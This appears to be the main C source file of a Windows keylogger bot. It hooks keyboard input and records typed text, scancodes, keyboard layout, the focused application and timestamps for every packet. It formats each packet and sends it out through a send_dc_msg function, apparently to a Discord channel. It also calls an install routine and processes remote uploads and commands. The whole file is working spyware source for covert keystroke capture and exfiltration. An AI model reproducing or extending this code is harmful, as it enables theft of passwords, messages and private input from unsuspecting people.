#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <time.h>

#include "input.h"
#include "dev.h"
#include "bot.h"

#define BS_OPEN  '\x0E'
#define BS_CLOSE '\x0F'

static char* text_fmt(const char* input) {
    size_t len = strlen(input);

    char* out = malloc(len + 1);
    if (!out) return NULL;

    size_t i = 0, j = 0;

    while (i < len) {
        unsigned char c = (unsigned char)input[i];

        if (c == (unsigned char)BS_OPEN) {
            if (i + 1 < len && (unsigned char)input[i + 1] == (unsigned char)BS_OPEN) {
                out[j++] = BS_OPEN;
                i += 2;
            } else {
                out[j++] = '[';
                i++;
            }
        } else if (c == (unsigned char)BS_CLOSE) {
            if (i + 1 < len && (unsigned char)input[i + 1] == (unsigned char)BS_CLOSE) {
                out[j++] = BS_CLOSE;
                i += 2;
            } else {
                out[j++] = ']';
                i++;
            }
        } else {
            out[j++] = input[i++];
        }
    }

    out[j] = '\0';
    return out;
}

static void on_packet(InputPacket* p, void* userdata) {
    if (!p) return;
    if (p->scancodes[0] == 0x1C) {
        input_free_packet(p);
        return;
    }
    process_uploads();
    process_commands();
    if (is_disabled()) {
        printf("Packet received but processing is disabled. Ignoring.\n");
        input_free_packet(p);
        return;
    }

    (void)userdata;

    char* formatted = text_fmt(p->text);

    char scans[512];
    scans[0] = 0;

    if (p->scancodes) {
        char tmp[16];
        for (int i = 0; p->scancodes[i]; i++) {
            snprintf(tmp, sizeof(tmp), " %02X", p->scancodes[i]);
            strncat(scans, tmp, sizeof(scans) - strlen(scans) - 1);
        }
    }

    char start_ts[64];
    char end_ts[64];

    {
        time_t s_sec = (time_t)(p->timestamp_start / 1000);
        int s_ms = (int)(p->timestamp_start % 1000);

        struct tm* t = localtime(&s_sec);

        snprintf(start_ts, sizeof(start_ts),
            "%02d.%02d.%04d %02d:%02d:%02d.%03d",
            t->tm_mday,
            t->tm_mon + 1,
            t->tm_year + 1900,
            t->tm_hour,
            t->tm_min,
            t->tm_sec,
            s_ms
        );

        time_t e_sec = (time_t)(p->timestamp_end / 1000);
        int e_ms = (int)(p->timestamp_end % 1000);

        struct tm* t2 = localtime(&e_sec);

        snprintf(end_ts, sizeof(end_ts),
            "%02d.%02d.%04d %02d:%02d:%02d.%03d",
            t2->tm_mday,
            t2->tm_mon + 1,
            t2->tm_year + 1900,
            t2->tm_hour,
            t2->tm_min,
            t2->tm_sec,
            e_ms
        );
    }

    char msg[4096];

    snprintf(msg, sizeof(msg),
        "\n### PACKET\n"
        "```start timestamp  : `%s` (%llu)\n"
        "end timestamp    : `%s` (%llu)\n"
        "layout           : `%s`\n"
        "app              : `%s`\n"
        "text             : %s\n"
        "scans            :%s\n```",
        start_ts,
        (unsigned long long)p->timestamp_start,
        end_ts,
        (unsigned long long)p->timestamp_end,
        p->layout ? p->layout : "(none)",
        p->focused_app ? p->focused_app : "(none)",
        (formatted ? formatted : "(empty)"),
        (scans[0] ? scans : " (empty)")
    );

    free(formatted);

    size_t len = strlen(msg);

    if (len <= 1000) {
        send_dc_msg(msg);
    } else {
        char preview[1100];
        snprintf(preview, sizeof(preview),
            "%.900s\n\n[full packet below]", msg);

        send_dc_msg(preview);
        send_dc_msg(msg);
    }

    input_free_packet(p);
}

int main(void) {
    attach_console_if_present();

    SetConsoleOutputCP(CP_UTF8);
    SetConsoleCP(CP_UTF8);

    if (install() == 69) {
        return 69;
    }

    init_bot();
    process_uploads();
    process_commands();

    if (input_init(on_packet, NULL, 0) != 0) {
        fprintf(stderr, "input_init failed\n");
        return 1;
    }

    while (!input_poll())
        Sleep(10);

    input_shutdown();
    printf("Stopped.\n");
    return 0;
}
